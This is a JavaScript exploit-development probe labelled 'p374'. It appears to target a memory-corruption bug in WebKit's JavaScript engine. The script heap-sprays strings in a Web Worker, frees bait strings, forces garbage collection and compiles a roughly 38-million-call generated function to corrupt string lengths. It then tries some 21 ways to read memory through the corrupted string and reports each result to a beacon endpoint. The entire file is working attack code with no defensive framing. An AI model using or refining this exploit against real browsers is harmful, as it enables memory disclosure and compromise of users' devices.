// p374 - MetadataTable JSString corruption: exhaustive data extraction
//
// p373 confirmed: Worker strings ALL corrupted (.length=81700), but charCodeAt
// produces no output (likely native SIGSEGV handled by WebKit signal handler).
//
// This probe tries EVERY possible JS method to extract data from the corrupted
// string. Each method in its own try/catch with immediate beacon before AND after.
//
// Also reports m_bytecodeIndex hypothesis: .length=81700 might be the sweep
// entry index (entry+68), not thunk address bytes.
//
// Beacon prefix: V374-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V374-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V374-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // Worker
  var workerCode = function() {
    var strings = [];
    var baseUrl = '';
    var STR_LEN = 100000;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V374-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }

    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    function tryMethod(name, fn) {
      beacon('TRY-' + name);
      try {
        var result = fn();
        beacon('OK-' + name + '-' + String(result).substring(0, 80));
        return result;
      } catch(e) {
        beacon('FAIL-' + name + '-' + String(e).substring(0, 40));
        return undefined;
      }
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }

      if (e.data.cmd === 'alloc') {
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          strings.push(s);
        }
        beacon('STRINGS-' + strings.length);
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');

        // Find first corrupted string
        var victim = -1;
        for (var i = 0; i < strings.length; i++) {
          try {
            if (strings[i].length !== STR_LEN) {
              victim = i;
              break;
            }
          } catch(e) {}
        }

        if (victim < 0) {
          beacon('NOCORRUPT');
          beacon('DONE');
          self.postMessage({ done: true });
          return;
        }

        var s = strings[victim];
        var newLen = s.length;
        beacon('VICTIM-' + victim + '-len' + newLen + '-hex' + newLen.toString(16));

        // Count total corrupted
        var total = 0;
        var allSameLen = true;
        for (var i = 0; i < strings.length; i++) {
          try {
            var L = strings[i].length;
            if (L !== STR_LEN) {
              total++;
              if (L !== newLen) allSameLen = false;
            }
          } catch(e) { total++; }
        }
        beacon('TOTAL-' + total + '-samelen' + allSameLen);

        // Now try every extraction method on the corrupted string
        // Each in its own try/catch with beacon BEFORE and AFTER

        // Method 1: typeof
        tryMethod('typeof', function() { return typeof s; });

        // Method 2: s.length (already known)
        tryMethod('length', function() { return s.length; });

        // Method 3: charCodeAt(0) - failed in p373
        tryMethod('charCodeAt0', function() { return s.charCodeAt(0); });

        // Method 4: charAt(0)
        tryMethod('charAt0', function() { return s.charAt(0); });

        // Method 5: bracket access s[0]
        tryMethod('bracket0', function() { return s[0]; });

        // Method 6: slice
        tryMethod('slice01', function() { return s.slice(0, 1); });

        // Method 7: substring
        tryMethod('substr01', function() { return s.substring(0, 1); });

        // Method 8: indexOf
        tryMethod('indexOf', function() { return s.indexOf('A'); });

        // Method 9: search with regex
        tryMethod('search', function() { return s.search(/A/); });

        // Method 10: String concatenation (triggers resolution)
        tryMethod('concat', function() {
          var r = '' + s;
          return r.length;
        });

        // Method 11: valueOf
        tryMethod('valueOf', function() {
          var v = s.valueOf();
          return typeof v + '-' + v.length;
        });

        // Method 12: comparison
        tryMethod('cmp', function() { return s === strings[victim]; });

        // Method 13: JSON.stringify
        tryMethod('json', function() {
          var j = JSON.stringify(s);
          return j ? j.length : 'null';
        });

        // Method 14: encodeURIComponent (reads each char)
        tryMethod('encode', function() {
          var e = encodeURIComponent(s.slice(0, 4));
          return e.substring(0, 40);
        });

        // Method 15: split
        tryMethod('split', function() {
          var parts = s.split('B');
          return parts.length;
        });

        // Method 16: repeat/test with small RegExp
        tryMethod('regex', function() {
          return /^A/.test(s);
        });

        // Method 17: startsWith
        tryMethod('starts', function() { return s.startsWith('A'); });

        // Method 18: codePointAt
        tryMethod('codePoint0', function() { return s.codePointAt(0); });

        // Method 19: normalize
        tryMethod('normalize', function() {
          var n = s.normalize();
          return n.length;
        });

        // Method 20: TextEncoder (reads bytes)
        tryMethod('textEnc', function() {
          var enc = new TextEncoder();
          var buf = enc.encode(s.slice(0, 8));
          var hex = '';
          for (var i = 0; i < buf.length; i++) hex += hexByte(buf[i]);
          return hex;
        });

        // Method 21: Blob from string
        tryMethod('blob', function() {
          var b = new Blob([s.slice(0, 16)]);
          return b.size;
        });

        // Method 22: Read length of different corrupted strings
        // (different entries hit different cells at different alignments)
        beacon('ALLLENS');
        for (var i = 0; i < strings.length; i++) {
          try {
            var L = strings[i].length;
            if (L !== STR_LEN) {
              beacon('L' + i + '-' + L);
            }
          } catch(e) {
            beacon('L' + i + '-CRASH');
          }
        }

        beacon('DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  // Bait strings
  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < 20; i++) {
    var bait = '';
    for (var j = 0; j < 100000; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, 100000);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-' + baits.length);

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      // Free baits
      for (var i = 0; i < baits.length; i++) baits[i] = null;
      baits = null;
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else {
          B('GC-' + gcR);
          build();
        }
      }
      gc();
    }
    if (e.data.done) B('ALL-DONE');
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p374fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p374ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p374ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
